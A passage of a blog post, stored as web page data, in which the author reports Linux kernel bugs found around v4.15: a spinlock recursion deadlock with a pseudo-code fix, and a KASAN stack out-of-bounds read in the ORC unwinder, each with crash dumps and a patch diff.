{"componentChunkName":"component---src-templates-post-tsx","path":"/2017-12-LK-Founds/","result":{"data":{"markdownRemark":{"html":"<h2 id=\"spin-lock-recursion-bug-leading-to-deadlock\" style=\"position:relative;\"><a href=\"#spin-lock-recursion-bug-leading-to-deadlock\" aria-label=\"spin lock recursion bug leading to deadlock permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>spin-lock recursion bug (leading to deadlock)</h2>\n<p>There's no recursion check on spinlock where I found it (not exact). So when executed recursively, deadlock is triggered.\nIt needs to check current and calling thread id so that avoiding deadlock at recursive cases.</p>\n<p>Below is pseudo-code for the patch.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">spinlock</span> <span class=\"token expression\"><span class=\"token operator\">-</span> lock</span></span>\n\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token keyword\">long</span> recursiveLockCount <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ownThreadId <span class=\"token operator\">==</span> calledThreadId<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token operator\">++</span>recursiveLockCount<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>recursiveLockCount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">spinlock</span> <span class=\"token expression\"><span class=\"token operator\">-</span> unlock</span></span>\n\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>recursiveLockCount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>ownThreadId <span class=\"token operator\">==</span> calledThreadId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token operator\">--</span>recursiveLockCount<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code></pre></div>\n<h3 id=\"call-trace-dump\" style=\"position:relative;\"><a href=\"#call-trace-dump\" aria-label=\"call trace dump permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Call Trace (Dump)</h3>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">Call Trace<span class=\"token operator\">:</span>\n __dump_stack lib<span class=\"token operator\">/</span>dump_stack<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">17</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n dump_stack<span class=\"token operator\">+</span><span class=\"token number\">0x104</span><span class=\"token operator\">/</span><span class=\"token number\">0x1c5</span> lib<span class=\"token operator\">/</span>dump_stack<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">53</span>\n spin_bug kernel<span class=\"token operator\">/</span>locking<span class=\"token operator\">/</span>spinlock_debug<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">75</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n debug_spin_lock_before kernel<span class=\"token operator\">/</span>locking<span class=\"token operator\">/</span>spinlock_debug<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">84</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n do_raw_spin_lock<span class=\"token operator\">+</span><span class=\"token number\">0x18c</span><span class=\"token operator\">/</span><span class=\"token number\">0x1d0</span> kernel<span class=\"token operator\">/</span>locking<span class=\"token operator\">/</span>spinlock_debug<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">112</span>\n rq_lock kernel<span class=\"token operator\">/</span>sched<span class=\"token operator\">/</span>sched<span class=\"token punctuation\">.</span>h<span class=\"token operator\">:</span><span class=\"token number\">1766</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n ttwu_queue kernel<span class=\"token operator\">/</span>sched<span class=\"token operator\">/</span>core<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1863</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n try_to_wake_up<span class=\"token operator\">+</span><span class=\"token number\">0x98e</span><span class=\"token operator\">/</span><span class=\"token number\">0x14e0</span> kernel<span class=\"token operator\">/</span>sched<span class=\"token operator\">/</span>core<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">2078</span>\n wake_up_worker kernel<span class=\"token operator\">/</span>workqueue<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">839</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n insert_work<span class=\"token operator\">+</span><span class=\"token number\">0x384</span><span class=\"token operator\">/</span><span class=\"token number\">0x4d0</span> kernel<span class=\"token operator\">/</span>workqueue<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1312</span>\n __queue_work<span class=\"token operator\">+</span><span class=\"token number\">0x537</span><span class=\"token operator\">/</span><span class=\"token number\">0x1160</span> kernel<span class=\"token operator\">/</span>workqueue<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1462</span>\n queue_work_on<span class=\"token operator\">+</span><span class=\"token number\">0x8f</span><span class=\"token operator\">/</span><span class=\"token number\">0xa0</span> kernel<span class=\"token operator\">/</span>workqueue<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1487</span>\n queue_work include<span class=\"token operator\">/</span>linux<span class=\"token operator\">/</span>workqueue<span class=\"token punctuation\">.</span>h<span class=\"token operator\">:</span><span class=\"token number\">488</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n call_usermodehelper_exec<span class=\"token operator\">+</span><span class=\"token number\">0x2a7</span><span class=\"token operator\">/</span><span class=\"token number\">0x470</span> kernel<span class=\"token operator\">/</span>umh<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">439</span>\n call_modprobe kernel<span class=\"token operator\">/</span>kmod<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">99</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n __request_module<span class=\"token operator\">+</span><span class=\"token number\">0x3ff</span><span class=\"token operator\">/</span><span class=\"token number\">0xc00</span> kernel<span class=\"token operator\">/</span>kmod<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">171</span>\n inet6_create<span class=\"token operator\">+</span><span class=\"token number\">0xc56</span><span class=\"token operator\">/</span><span class=\"token number\">0x1200</span> net<span class=\"token operator\">/</span>ipv6<span class=\"token operator\">/</span>af_inet6<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">156</span>\n __sock_create<span class=\"token operator\">+</span><span class=\"token number\">0x4c8</span><span class=\"token operator\">/</span><span class=\"token number\">0x810</span> net<span class=\"token operator\">/</span>socket<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1265</span>\n sock_create net<span class=\"token operator\">/</span>socket<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1305</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n SYSC_socket net<span class=\"token operator\">/</span>socket<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1335</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n SyS_socket<span class=\"token operator\">+</span><span class=\"token number\">0xdb</span><span class=\"token operator\">/</span><span class=\"token number\">0x190</span> net<span class=\"token operator\">/</span>socket<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1315</span>\n entry_SYSCALL_64_fastpath<span class=\"token operator\">+</span><span class=\"token number\">0x1f</span><span class=\"token operator\">/</span><span class=\"token number\">0x96</span>\nRIP<span class=\"token operator\">:</span> <span class=\"token number\">0033</span><span class=\"token operator\">:</span><span class=\"token number\">0x4565b9</span>\nRSP<span class=\"token operator\">:</span> <span class=\"token number\">002</span>b<span class=\"token operator\">:</span><span class=\"token number\">00007f</span><span class=\"token number\">85</span>ab8b2bd8 EFLAGS<span class=\"token operator\">:</span> <span class=\"token number\">00000216</span> ORIG_RAX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000029</span>\nRAX<span class=\"token operator\">:</span> ffffffffffffffda RBX<span class=\"token operator\">:</span> <span class=\"token number\">00007f</span><span class=\"token number\">85</span>ab8b3700 RCX<span class=\"token operator\">:</span> <span class=\"token number\">00000000004565</span>b9\nRDX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000004</span> RSI<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000800</span> RDI<span class=\"token operator\">:</span> <span class=\"token number\">000000000000000</span>a\nRBP<span class=\"token operator\">:</span> <span class=\"token number\">00007ff</span>c612e5ac0 R08<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> R09<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span>\nR10<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> R11<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000216</span> R12<span class=\"token operator\">:</span> <span class=\"token number\">00007ff</span>c612e5a3e\nR13<span class=\"token operator\">:</span> <span class=\"token number\">00007ff</span>c612e5a3f R14<span class=\"token operator\">:</span> <span class=\"token number\">00007f</span><span class=\"token number\">85</span>ab8b3700 R15<span class=\"token operator\">:</span> <span class=\"token number\">00007f</span><span class=\"token number\">85</span>ab8b39c0</code></pre></div>\n<h2 id=\"unwind_orc---stack-out-of-bound\" style=\"position:relative;\"><a href=\"#unwind_orc---stack-out-of-bound\" aria-label=\"unwind_orc   stack out of bound permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>unwind_orc - stack out-of-bound</h2>\n<ul>\n<li>Read 8 bytes stack oob in unwind_next_frame</li>\n</ul>\n<p>I just found the bug stack OOB (8 bytes read) in unwind_orc. So, I just tested it on the latest LK (v4.15.0-rc4 currently),\nand it worked. But, I found the commit about this bug(?).\nHe (Commiter) said...</p>\n<blockquote>\n<p>\"The ORC unwinder got confused by some kprobes changes, which isn't</p>\n</blockquote>\n<p>surprising since the runtime code no longer matches vmlinux, and the\nstack was modified for kretprobes. <br />\nUntil we have a way for generated code to register changes with the\nunwinder, these types of warnings are inevitable.  So just disable KASAN\nchecks for stack accesses in the ORC unwinder.\"</p>\n<p>Also, you can see it <a href=\"https://github.com/torvalds/linux/commit/881125bfe65bb772f34f4fcb04a35dfe117e186a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">here</a>\nIt was found &#x26; patched at LK v4.14.0-rc8 on 2017/11/8.</p>\n<p>In short, it is intended! not a BUG. In addition, if it is a bug, it just a kinda memory disclosure useless :|.</p>\n<h3 id=\"before--after\" style=\"position:relative;\"><a href=\"#before--after\" aria-label=\"before  after permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Before &#x26; After</h3>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">@@ <span class=\"token operator\">-</span><span class=\"token number\">279</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span> <span class=\"token operator\">+</span><span class=\"token number\">279</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span> @@ <span class=\"token keyword\">static</span> bool <span class=\"token function\">deref_stack_reg</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">unwind_state</span> <span class=\"token operator\">*</span>state<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> addr<span class=\"token punctuation\">,</span>\n \t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">stack_access_ok</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \t\t<span class=\"token keyword\">return</span> false<span class=\"token punctuation\">;</span>\n \n<span class=\"token operator\">-</span>\t<span class=\"token operator\">*</span>val <span class=\"token operator\">=</span> <span class=\"token function\">READ_ONCE_TASK_STACK</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">-></span>task<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token operator\">*</span>val <span class=\"token operator\">=</span> <span class=\"token function\">READ_ONCE_NOCHECK</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \t<span class=\"token keyword\">return</span> true<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n </code></pre></div>\n<p>see the difference? yes, READ_ONCE_TASK_STACK to READ_ONCE_NOCHECK.</p>\n<h3 id=\"call-trace-dump-1\" style=\"position:relative;\"><a href=\"#call-trace-dump-1\" aria-label=\"call trace dump 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Call Trace (Dump)</h3>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">BUG<span class=\"token operator\">:</span> KASAN<span class=\"token operator\">:</span> stack<span class=\"token operator\">-</span>out<span class=\"token operator\">-</span>of<span class=\"token operator\">-</span>bounds in deref_stack_regs arch<span class=\"token operator\">/</span>x86<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>unwind_orc<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">302</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\nBUG<span class=\"token operator\">:</span> KASAN<span class=\"token operator\">:</span> stack<span class=\"token operator\">-</span>out<span class=\"token operator\">-</span>of<span class=\"token operator\">-</span>bounds in unwind_next_frame<span class=\"token operator\">+</span><span class=\"token number\">0x15a6</span><span class=\"token operator\">/</span><span class=\"token number\">0x1e60</span> arch<span class=\"token operator\">/</span>x86<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>unwind_orc<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">438</span>\nRead of size <span class=\"token number\">8</span> at addr ffff8800762674f0 by task syz<span class=\"token operator\">-</span>executor3<span class=\"token operator\">/</span><span class=\"token number\">2870</span>\n\nCPU<span class=\"token operator\">:</span> <span class=\"token number\">2</span> PID<span class=\"token operator\">:</span> <span class=\"token number\">2870</span> Comm<span class=\"token operator\">:</span> syz<span class=\"token operator\">-</span>executor3 Not tainted <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>rc3<span class=\"token operator\">+</span> #<span class=\"token number\">3</span>\nHardware name<span class=\"token operator\">:</span> QEMU Standard <span class=\"token function\">PC</span> <span class=\"token punctuation\">(</span>i440FX <span class=\"token operator\">+</span> PIIX<span class=\"token punctuation\">,</span> <span class=\"token number\">1996</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BIOS Ubuntu<span class=\"token operator\">-</span><span class=\"token number\">1.8</span><span class=\"token number\">.2</span><span class=\"token operator\">-</span><span class=\"token number\">1u</span>buntu1 <span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">01</span><span class=\"token operator\">/</span><span class=\"token number\">2014</span>\nCall Trace<span class=\"token operator\">:</span>\n __dump_stack lib<span class=\"token operator\">/</span>dump_stack<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">17</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n dump_stack<span class=\"token operator\">+</span><span class=\"token number\">0x104</span><span class=\"token operator\">/</span><span class=\"token number\">0x1cd</span> lib<span class=\"token operator\">/</span>dump_stack<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">53</span>\n print_address_description<span class=\"token operator\">+</span><span class=\"token number\">0x60</span><span class=\"token operator\">/</span><span class=\"token number\">0x224</span> mm<span class=\"token operator\">/</span>kasan<span class=\"token operator\">/</span>report<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">252</span>\n kasan_report_error mm<span class=\"token operator\">/</span>kasan<span class=\"token operator\">/</span>report<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">351</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n kasan_report<span class=\"token operator\">+</span><span class=\"token number\">0x16b</span><span class=\"token operator\">/</span><span class=\"token number\">0x260</span> mm<span class=\"token operator\">/</span>kasan<span class=\"token operator\">/</span>report<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">409</span>\n\nThe buggy address belongs to the page<span class=\"token operator\">:</span>\npage<span class=\"token operator\">:</span><span class=\"token number\">00000000f</span><span class=\"token number\">387e2</span>cc count<span class=\"token operator\">:</span><span class=\"token number\">0</span> mapcount<span class=\"token operator\">:</span><span class=\"token number\">0</span> mapping<span class=\"token operator\">:</span>          <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span> index<span class=\"token operator\">:</span><span class=\"token number\">0x0</span>\nflags<span class=\"token operator\">:</span> <span class=\"token number\">0x500000000000000</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nraw<span class=\"token operator\">:</span> <span class=\"token number\">0500000000000000</span> <span class=\"token number\">0000000000000000</span> <span class=\"token number\">0000000000000000</span> <span class=\"token number\">00000000ffff</span>ffff\nraw<span class=\"token operator\">:</span> ffffea0001d899e0 ffffea0001d899e0 <span class=\"token number\">0000000000000000</span> <span class=\"token number\">0000000000000000</span>\npage dumped because<span class=\"token operator\">:</span> kasan<span class=\"token operator\">:</span> bad access detected\n\nMemory state around the buggy address<span class=\"token operator\">:</span>\n ffff880076267380<span class=\"token operator\">:</span> f2 f2 f2 f2 f2 f2 <span class=\"token number\">00</span> f2 f2 f2 f2 f2 f2 f2 <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n ffff880076267400<span class=\"token operator\">:</span> f2 f2 f3 f3 f3 f3 <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n<span class=\"token operator\">></span>ffff880076267480<span class=\"token operator\">:</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> f1 f1 f1\n                                                             <span class=\"token operator\">^</span>\n ffff880076267500<span class=\"token operator\">:</span> f1 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2\n ffff880076267580<span class=\"token operator\">:</span> f2 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2\n<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>\nKernel panic <span class=\"token operator\">-</span> not syncing<span class=\"token operator\">:</span> panic_on_warn set <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\nCPU<span class=\"token operator\">:</span> <span class=\"token number\">2</span> PID<span class=\"token operator\">:</span> <span class=\"token number\">2870</span> Comm<span class=\"token operator\">:</span> syz<span class=\"token operator\">-</span>executor3 Tainted<span class=\"token operator\">:</span> G    B            <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>rc3<span class=\"token operator\">+</span> #<span class=\"token number\">3</span>\nHardware name<span class=\"token operator\">:</span> QEMU Standard <span class=\"token function\">PC</span> <span class=\"token punctuation\">(</span>i440FX <span class=\"token operator\">+</span> PIIX<span class=\"token punctuation\">,</span> <span class=\"token number\">1996</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BIOS Ubuntu<span class=\"token operator\">-</span><span class=\"token number\">1.8</span><span class=\"token number\">.2</span><span class=\"token operator\">-</span><span class=\"token number\">1u</span>buntu1 <span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">01</span><span class=\"token operator\">/</span><span class=\"token number\">2014</span>\nCall Trace<span class=\"token operator\">:</span>\n __dump_stack lib<span class=\"token operator\">/</span>dump_stack<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">17</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n dump_stack<span class=\"token operator\">+</span><span class=\"token number\">0x104</span><span class=\"token operator\">/</span><span class=\"token number\">0x1cd</span> lib<span class=\"token operator\">/</span>dump_stack<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">53</span>\n panic<span class=\"token operator\">+</span><span class=\"token number\">0x1aa</span><span class=\"token operator\">/</span><span class=\"token number\">0x39b</span> kernel<span class=\"token operator\">/</span>panic<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">183</span>\n kasan_end_report<span class=\"token operator\">+</span><span class=\"token number\">0x43</span><span class=\"token operator\">/</span><span class=\"token number\">0x49</span> mm<span class=\"token operator\">/</span>kasan<span class=\"token operator\">/</span>report<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">176</span>\n kasan_report_error mm<span class=\"token operator\">/</span>kasan<span class=\"token operator\">/</span>report<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">356</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n kasan_report<span class=\"token punctuation\">.</span>cold<span class=\"token punctuation\">.</span><span class=\"token number\">5</span><span class=\"token operator\">+</span><span class=\"token number\">0xb5</span><span class=\"token operator\">/</span><span class=\"token number\">0xe1</span> mm<span class=\"token operator\">/</span>kasan<span class=\"token operator\">/</span>report<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">409</span>\nDumping ftrace buffer<span class=\"token operator\">:</span>\n   <span class=\"token punctuation\">(</span>ftrace buffer empty<span class=\"token punctuation\">)</span>\nKernel Offset<span class=\"token operator\">:</span> <span class=\"token number\">0x15000000</span> from <span class=\"token number\">0xffffffff81000000</span> <span class=\"token punctuation\">(</span>relocation range<span class=\"token operator\">:</span> <span class=\"token number\">0xffffffff80000000</span><span class=\"token operator\">-</span><span class=\"token number\">0xffffffffbfffffff</span><span class=\"token punctuation\">)</span>\nRebooting in <span class=\"token number\">86400</span> seconds<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code></pre></div>\n<h2 id=\"prlimit64-leading-to-kernel-panic\" style=\"position:relative;\"><a href=\"#prlimit64-leading-to-kernel-panic\" aria-label=\"prlimit64 leading to kernel panic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 